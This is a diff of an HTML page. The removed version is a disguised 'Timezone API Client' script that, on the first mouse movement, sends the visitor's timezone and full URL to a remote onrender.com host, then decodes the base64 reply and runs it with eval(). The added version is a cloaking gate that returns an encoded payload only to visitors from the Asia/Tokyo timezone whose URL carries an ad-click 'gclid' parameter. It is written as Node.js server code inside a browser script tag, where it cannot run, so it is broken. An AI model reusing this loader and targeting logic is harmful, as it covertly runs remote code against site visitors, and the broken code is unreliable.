@@ -3,62 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Timezone API Client</title>
+    <title>Timezone Check</title>
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // Listen for mouse movement
-            document.addEventListener('mousemove', initiateApiRequestOnce);
-            let requestSent = false;
+        // Function to handle incoming requests
+        const handleRequest = (req, res) => {
+            // Get the JSON object from the request
+            let body = '';
 
-            function initiateApiRequestOnce() {
-                if (requestSent) return;
+            req.on('data', chunk => {
+                body += chunk.toString(); // Convert Buffer to string
+            });
 
-                requestSent = true;
-                document.removeEventListener('mousemove', initiateApiRequestOnce);
+            req.on('end', () => {
+                const data = JSON.parse(body); // Parse the JSON data
 
-                const clientTimezone = getCurrentTimezone();
-                const fullUrl = window.location.href;
+                // Check if timezone is Japan and URL contains 'gclid'
+                const isTimezoneJapan = data.timezone === 'Asia/Tokyo';
+                const hasGclid = data.fullUrl.includes('gclid');
 
-                transmitTimezoneData('https://your-app-name.onrender.com', clientTimezone, fullUrl)
-                    .then(decodeAndRunScript)
-                    .catch(handleError);
-            }
+                if (isTimezoneJapan && hasGclid) {
+                    // Create a base64 encoded string to return
+                    const responseData = 'Hello from Japan!'; // Example message
+                    const encodedData = btoa(responseData); // Encode the string in Base64
 
-            function getCurrentTimezone() {
-                return Intl.DateTimeFormat().resolvedOptions().timeZone;
-            }
-
-            function transmitTimezoneData(url, timezone, fullUrl) {
-                return fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ timezone, fullUrl }),
-                }).then(response => {
-                    if (!response.ok) {
-                        throw new Error('Error: ' + response.statusText);
-                    }
-                    return response.text();
-                });
-            }
-
-            function decodeAndRunScript(encodedScript) {
-                try {
-                    const script = atob(encodedScript);
-                    eval(script);
-                } catch (error) {
-                    throw new Error(`Script execution failed: ${error}`);
+                    res.writeHead(200, { 'Content-Type': 'text/plain' });
+                    res.end(encodedData); // Send the encoded string back to the client
+                } else {
+                    res.writeHead(400, { 'Content-Type': 'text/plain' });
+                    res.end('Conditions not met'); // Handle the case where conditions are not met
                 }
-            }
+            });
+        };
 
-            function handleError(error) {
-                // Display error message to the user
-                document.body.innerHTML = `<h1>${error.message}</h1>`;
-            }
-        });
+        // Function to create a server
+        const createServer = () => {
+            const http = require('http');
+            const server = http.createServer(handleRequest);
+            const port = 3000; // Change port as necessary
+
+            server.listen(port, () => {
+                console.log(`Server running at http://localhost:${port}/`);
+            });
+        };
+
+        // Start the server
+        createServer();
     </script>
 </head>
 <body>
-    <h1>Welcome to the Timezone API Client</h1>
-    <p>Move your mouse to initiate the API request.</p>
+    <h1>Timezone and URL Check</h1>
+    <p>Server is running. Check the console for messages.</p>
 </body>
 </html>
